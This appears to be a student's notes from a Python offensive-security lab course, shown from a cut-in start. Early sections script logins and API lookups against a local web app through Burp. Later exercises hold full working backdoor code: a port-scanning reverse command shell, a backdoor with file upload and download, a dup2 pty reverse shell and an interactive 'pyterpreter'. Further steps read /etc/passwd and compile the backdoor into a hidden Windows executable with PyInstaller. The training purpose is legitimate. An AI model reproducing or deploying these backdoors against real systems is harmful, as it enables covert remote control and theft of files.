print("SERVER HEADERS", response.headers)
print("COOKIES:  ",browser.cookies.items())
#STOP DONT COPY ALL OF IT!  Now examine the request/response in burp.

browser.headers['User-Agent']='Mozilla FutureBrowser 145.9'
postdata = {'inputName':'apiusername','inputPassword':'apipassword'}
response = browser.post('http://127.0.0.1:5730/login', postdata)
print("RESPONSE: ", response.status_code, response.reason)
print("SERVER HEADERS", response.headers)
print("COOKIES:  ",browser.cookies.items())
#STOP DONT COPY ALL OF IT!  Now examine the request/response in burp.

browser.headers['SomeSpecialHeader']='Send This Value Also'
postdata = {'inputMAC':'00:00:5e:00:01:02'}
content = browser.post('http://127.0.0.1:5730/data', postdata).content
print(content)
postdata = {'inputMAC':'00:00:00:00:00:00'}
content = browser.post('http://127.0.0.1:5730/data', postdata).content
print(content)
```

	python3

```python
>>> import requests

>>> browser = requests.session()
>>> browser.proxies['http'] = 'http://127.0.0.1:8080'
>>> postdata = {'inputName':'hacker', 'inputPassword':'letmein'}
>>> response = browser.post('http://127.0.0.1:5730/login', postdata, allow_redirects = False)

>>> print("RESPONSE: ", response.status_code, response.reason)
RESPONSE:  302 FOUND
>>> print("SERVER HEADERS: ", response.headers)
SERVER HEADERS:  {'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '219', 'Location': 'http://127.0.0.1:5730/login', 'Vary': 'Cookie', 'Set-Cookie': 'session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkluY29ycmVjdCBVc2VybmFtZSBvciBQYXNzd29yZCJdfV19.YgEYrQ.DKu9wbTeNKa2GfhvX0AyZYP00fo; HttpOnly; Path=/', 'Server': 'Werkzeug/0.14.1 Python/3.6.8', 'Date': 'Mon, 07 Feb 2022 13:03:41 GMT'}
>>> print("COOKIES: ", browser.cookies.items())
COOKIES:  [('session', 'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkluY29ycmVjdCBVc2VybmFtZSBvciBQYXNzd29yZCJdfV19.YgEYrQ.DKu9wbTeNKa2GfhvX0AyZYP00fo')]

>>> browser.headers['User-Agent']='Mozilla FutureBrowser 145.9'
>>> postdata = {'inputName':'apiusername','inputPassword':'apipassword'}
>>> response = browser.post('http://127.0.0.1:5730/login', postdata)

>>> print("RESPONSE: ", response.status_code, response.reason)
RESPONSE:  200 OK
>>> print("SERVER HEADERS", response.headers)
SERVER HEADERS {'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '1952', 'Vary': 'Cookie', 'Server': 'Werkzeug/0.14.1 Python/3.6.8', 'Date': 'Mon, 07 Feb 2022 14:56:34 GMT'}
>>> print("COOKIES:  ",browser.cookies.items())
COOKIES:   [('session', 'eyJsb2dnZWRpbiI6dHJ1ZX0.YgEzIg.N5bBdFtQQncWw8mZ1FcDvRagrgY')]
```

```js
<script> function submit_it() {
            $.ajax({
                url: '/data',							<<--------
                data: {inputMAC:$('#inputMAC').val()},	<<--------
                type: 'POST',							<<--------
                success: function(response) {
                    $('#lblResult').text(response);
                    }
                });
    };
    $('#btnSignIn').click(function() {					<<--------
      submit_it();										<<--------
    });
    $('#inputMAC').keyup(function(e) {
        e.preventDefault();
        if (e.which == 13) {
            submit_it();
        }
    });
</script>
```

```python
>>> browser.headers['SomeSpecialHeader'] = 'Send This Value Also'
>>> postdata = {'inputMAC':'00:00:5e:00:01:02'}
>>> content = browser.post('http://127.0.0.1:5730/data', postdata).content
>>> print(content)
b'(30.28082657, -97.2975235)'
```

	vi /home/student/Documents/pythonclass/apps/geolookup.py

```python
import requests

def lookup_ssid(macaddress):
    postdata = {'inputMAC':macaddress}
    return browser.post('http://127.0.0.1:5730/data', postdata).content

ssids = ['12:34:56:78:90','00:00:0c:9f:f0:01', 'aa:bb:cc:dd:ee:ff', '00:00:5e:00:01:1b', '00:00:5e:00:01:02', '00:00:5e:00:01:32', '68:1c:a2:06:68:ee', '14:d6:4d:25:57:86', '00:00:00:00:00:00', '00:00:5e:00:52:13', '00:00:00:dd:dd:dd', '00:00:0c:9f:f0:c9', '00:1b:17:00:01:15', '00:11:74:48:8f:30', '00:00:0c:9f:f0:cb']

browser = requests.session()
postdata = {'inputName':'apiusername','inputPassword':'apipassword'}
response = browser.post('http://127.0.0.1:5730/login', postdata)
if response.status_code == 200:
    print("You have been logged in")
    for eachmac in ssids:
        print("Looking up {0}".format(eachmac))
        print("-----", lookup_ssid(eachmac))
```

	python3 geolookup.py 

```text
You have been logged in
Looking up 12:34:56:78:90
----- b'NOT FOUND'
Looking up 00:00:0c:9f:f0:01
----- b'(41.71396255, -87.8015976)'
Looking up aa:bb:cc:dd:ee:ff
----- b'(40.58861542, -50.79531097)'
Looking up 00:00:5e:00:01:1b
----- b'(41.88912582, -87.63746643)'
Looking up 00:00:5e:00:01:02
----- b'(30.28082657, -97.2975235)'
Looking up 00:00:5e:00:01:32
----- b'(52.3591423, -1.15627098)'
Looking up 68:1c:a2:06:68:ee
----- b'(38.90050125, -77.02975464)'
Looking up 14:d6:4d:25:57:86
----- b'(38.90077209, -77.02884674)'
Looking up 00:00:00:00:00:00
----- b'The phone call is coming from INSIDE THE HOUSE'
Looking up 00:00:5e:00:52:13
----- b'(28.54624748, -81.22086334)'
Looking up 00:00:00:dd:dd:dd
----- b'(41.57791138, -109.25166321)'
Looking up 00:00:0c:9f:f0:c9
----- b'(30.39469528, -97.74517822)'
Looking up 00:1b:17:00:01:15
----- b'(41.11668777, 1.25586557)'
Looking up 00:11:74:48:8f:30
----- b'(33.99902725, -81.03439331)'
Looking up 00:00:0c:9f:f0:cb
----- b'(30.41900635, -97.70226288)'
```

**Conclusions:**

You are finished with this lab. You can now close all of the applications that were used in this lab. That includes the GEOIP web application, the Burp Suite, Python, and gedit.

In this lab, we learned how to use Requests to interact with a webpage to:

- Log in to a web form with a username and password
- Selectively follow redirection commands
- Submit data to an API used by a jquery form
- Create custom HTTP headers
- Modify the User‐Agent
- Maintain sessions interacting with web APIs

### Exercise 5.1: Socket Essentials

- [x] 

**Objectives:**
- Understand Python sockets
- Write a program that connects outbound to a Netcat listener, downloads a file, and prints it to the screen

		nc -lp 9000
		python3

Socket Client:

```python
>>> import socket
>>> mysocket = socket.socket()
>>> mysocket.connect(("127.0.0.1", 9000))		// connect to [127.0.0.1] from localhost [127.0.0.1] 58352
>>> mysocket.send("Hello\n".encode())			// Hello
6
>>> mysocket.send("Are you there\n".encode())	// Are you there
14
												// I am here!
>>> mysocket.recv(100)
b'I am here!\n'
>>> mysocket.recv(100).decode					// Are you waiting on me?
'Are you waiting on me?\n'
```

Socket Server:

```python
>>> import socket

>>> myserver = socket.socket()
>>> myserver.bind(("", 5000))
>>> myserver.listen(1)			// nc -v 127.0.0.1 5000	// localhost [127.0.0.1] 5000 (?) open

>>> connection, remoteip = myserver.accept()
>>> print(remoteip)
('127.0.0.1', 59336)

>>> connection.send("Hello There\n".encode())			// Hello There
12
>>> connection.send(b"Hello There\n")					// Hello There
12
>>> connection.recv(1024).decode()						// Back at you!
'Back at you!\n'


```

Plant a File on a Target:

	cat filetoplant.txt 			    // Consider this proof that youve been 0wn3d
	nc -lvp 8000 < filetoplant.txt	// listening on [any] 8000 ...

	gedit filegrabberclient.py &

```python
import socket

mysocket = socket.socket()
mysocket.connect(("127.0.0.1", 8000))
while True:
	print(mysocket.recv(2048).decode())
```

	python3 filegrabberclient.py	// Consider this proof that youve been 0wn3d	// connect to [127.0.0.1] from localhost [127.0.0.1] 59642

	python3 filegrabberclient.py 

```text
Traceback (most recent call last):
  File "filegrabberclient.py", line 4, in <module>
    mysocket.connect(("127.0.0.1", 8000))
ConnectionRefusedError: [Errno 111] Connection refused
```

**Conclusions:**

- Worked with Python sockets
- Created a script to connect to a Netcat listener, downloaded a file, and printed it to the screen

### Exercise 5.2: Exception Handling

- [x] 

**Objectives:**
- Understand Python exception handling
- Continue adding to filegrabberclient.py

	gedit filegrabberclientwithexception.py &

Pseudo-code:

```text
until we get a connection:
	for each port in our list of ports:
		delay for a second
		try:
			mysocket.connect(("127.0.0.1", PortFromList))
		except socket.error:
			Didn't work.
				Let's try the next port in our list
		else:
			It worked!
			exit the for loop and the while loop
```

```python
import socket, time

mysocket = socket.socket()
connected = False
while not connected:
	for port in [21, 22, 81, 443, 8000]:
		time.sleep(1)
		try:
			print("Trying", port, end=" ")
			mysocket.connect(("127.0.0.1", port))
		except:
			print("Nope")
			continue
		else:
			print("Connected")
			connected = True
			break

while True:
	print(mysocket.recv(2048).decode())
```

	python3 ./filegrabberclientwithexception.py	// nc -lvp 8000 < filetoplant.txt

```text
Trying 21 Nope
Trying 22 Nope
Trying 81 Nope
Trying 443 Nope
Trying 8000 Connected
Consider this proof that youve been 0wn3d
```

**Conclusions:**

- You added exception handling to the file grabber client
- Added ability to try connecting to different ports (21, 22, 81, 443, and 8000)
- Added a delay between each attempt

### Exercise 5.3: Process Execution

- [x] 

**Objectives:**
- Understand Python process execution
- Continue adding to filegrabberclient.py

		python3

```python
>>> import subprocess
>>> prochandle = subprocess.Popen("cat /etc/passwd", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
>>> output, error = prochandle.communicate()
>>> print(error)
b''

>>> print(output.decode())
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

	gedit reversecommandshell.py &

```python
import socket
import time
import subprocess

print("it started")
mysocket = socket.socket()
connected = False
while not connected:
    for port in [21, 22, 81, 443, 8000]:
        time.sleep(1)
        try:
            print("Trying", port, end=' ')
            mysocket.connect(("127.0.0.1", port))
        except socket.error:
            print("Nope")
            continue
        else:
            print("Connected")
            connected = True
            break

while True:
	commandrequested = mysocket.recv(1024)
	prochandle = subprocess.Popen(commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	results, errors = prochandle.communicate()
	results = results + errors
	mysocket.send(results)
```

Run on victim:

	python3 reversecommandshell.py 

```text
it started
Trying 21 Nope
Trying 22 Nope
Trying 81 Nope
Trying 443 Nope
Trying 8000 Connected
```

Run on attacker:

	nc -lvp 8000	// cat /etc/passwd

```bash
listening on [any] 8000 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 59704
```

	cat /etc/passwd

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

**Conclusions:**

In this lab, we modified our filegrabberclientwithexception.py program to replace the while loop at the bottom with a loop that will execute code and send the results back to the attacker. You now have a fully functional backdoor, but it is in the form of a Python script and is not easily run on Windows target systems.

### Exercise 5.4: Python Backdoor

- [x] 

**Objectives:**
- Move source code to Windows
- Point our backdoor to your remote Linux system
- Run backdoor on Windows and control it from Linux
- Create an executable using PyInstaller

Attacker: 

	cd /home/student/Documents/pythonclass/apps
	python3 -m httpserver 9000

Windows:

	firefox http://<attacker_ip>:9000	// download reversecommandshell-final.py

Attacker:

	nc -lvp 8000

Windows:

```text
- Change the IP address in the script to the attacker machine.
- Run the program in IDLE (Integrated Desktop Learning Environment)	// it started, Trying 21...
```

Make the Backdoor Executable:

	pyinstaller.exe --noconsole --onefile reversecommandshell-final.py	// executable will be in dist directory

**Conclusions:**

- Moved source code to Windows using a Python web server
- Pointed our backdoor to use the IP address of Linux
- Ran backdoor on Windows and controlled Windows from Linux
- Created an executable using PyInstaller with various options

### Exercise 5.5: recvall()

- [x] 

**Objectives:**
- Understand select.select
- Add upload and download capabilities to your backdoor

	nc -lvp 9000
	python3

```python
>>> import socket
>>> import select

>>> s = socket.socket()
>>> s.connect(("127.0.0.1", 9000))	// connect to [127.0.0.1] from localhost [127.0.0.1] 58426

>>> select.select([s],[s],[s])
([], [<socket.socket fd=3, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 58426), raddr=('127.0.0.1', 9000)>], [])	// HELLO

>>> select.select([s],[s],[s])
([<socket.socket fd=3, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 58426), raddr=('127.0.0.1', 9000)>], [<socket.socket fd=3, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 58426), raddr=('127.0.0.1', 9000)>], [])
```

	gedit backdoor-withupload-final.py &

```python
import socket
import time
import subprocess
import codecs

def upload(mysocket):
    mysocket.send(b"What is the name of the file you are uploading?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"What unique string will end the transmission?:")
    endoffile = mysocket.recv(1024)
    mysocket.send(b"Transmit the file as a base64 encoded string followed by the end of transmission string.\n")
    data = b""
    while not data.endswith(endoffile):
        data += mysocket.recv(1024)
    try:
        fh = open(fname.strip(), "w")
        fh.write(codecs.decode(data[:-len(endoffile)], "base64").decode("latin-1"))
        fh.close()
    except Exception as e:
        mysocket.send("An error occured uploading file {0}. {1}".format(fname, str(e)).encode())
    else:
        mysocket.send(fname.strip().encode() + b" successfully uploaded")


def download(mysocket):
    mysocket.send(b"What file do you want (including path)?:")
    fname = mysocket.recv(1024).decode()
    mysocket.send(b"Receive a base64 encoded string containing your file will end with !EOF!\n")
    try:
        data = codecs.encode(open(fname.strip(),"rb").read(), "base64")
    except Exception as e:
        data = "An error occured downloading the file {0}. {1}".format(fname, str(e)).encode()
    mysocket.sendall(data + "!EOF!".encode())


def ScanAndConnect():
    print("it started")
    connected = False
    while not connected:
        for port in [21, 22, 81, 443, 8000]:
            time.sleep(1)
            try:
                print("Trying", port, end=" ")
                mysocket.connect(("127.0.0.1", port))
            except socket.error:
                print("Nope")
                continue
            else:
                print("Connected")
                connected = True
                break

mysocket = socket.socket()
ScanAndConnect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode()
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            ScanAndConnect()
            continue
        if commandrequested[:4] == "QUIT":
            mysocket.send(b"Terminating Connection.")
            break
        if commandrequested[:6] == "UPLOAD":
            upload(mysocket)
            continue
        if commandrequested[:8] == "DOWNLOAD":
            download(mysocket)
            continue
        prochandle = subprocess.Popen(
            commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results, errors = prochandle.communicate()
        results = results + errors
        mysocket.send(results)
    except socket.error:
        break
    except Exception as e:
        mysocket.send(bytes(str(e), "utf-8"))
        break
```

### Exercise 5.6: Dup2 and pyTerpreter

- [x] 

**Objectives:**
- Experiment with a few backdoors

	nc -lvp 8888
	gedit dup2-backdoor.py &

```python
import socket,os, subprocess,pty
s=socket.socket()
s.connect(("127.0.0.1",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```

	python dup2-backdoor.py

```text
listening on [any] 8888 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 45520
$ whoami
whoami
student
$ pwd
pwd
/home/student/Documents/pythonclass/apps
$ cd /
cd /
$ pwd
pwd
/
```

	nc -lvp 9000
	python pyterpreter.py

```text
listening on [any] 9000 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 58430

Welcome to pyterpreter

>>> a = 5
>>> print(a)
5

>>> print(execute("ls"))
backdoor-final.py
backdoor-withupload-final.py
backdoor-withupload.py
dup2-backdoor.py
filegrabberclient-final.py
filegrabberclient.py
filegrabberclientwithexception-final.py
filegrabberclientwithexception.py
filetoplant.txt
geofind-through-burp-exercise.txt
geolookup.py
image-forensics-final.py
image-forensics.py
pyterpreter.py
reversecommandshell-final.py
reversecommandshell.py
scapy_helper.py
sniff-final.py
sniff.py
sockettcpclient.py
sockettcpserver.py
tab_complete.py
werejugo
```

	gedit pyterpreter.py &

```python
import socket, os, subprocess, code, sys, time

class MySocket(socket.socket):
    def __init__(self, *args):
        socket.socket.__init__(self, *args)
    def write(self, text):
        return self.send(text.encode())
    def readline(self):
        return self.recv(2048).decode()

def execute(cmd):
    ph = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    results, errors = ph.communicate()
    results = results + errors
    return results.decode()
        
s = MySocket()
s.connect(("127.0.0.1", 9000))
sys.stdout=sys.stdin=sys.stderr=s
code.interact("Welcome to pyterpreter",local=locals())

```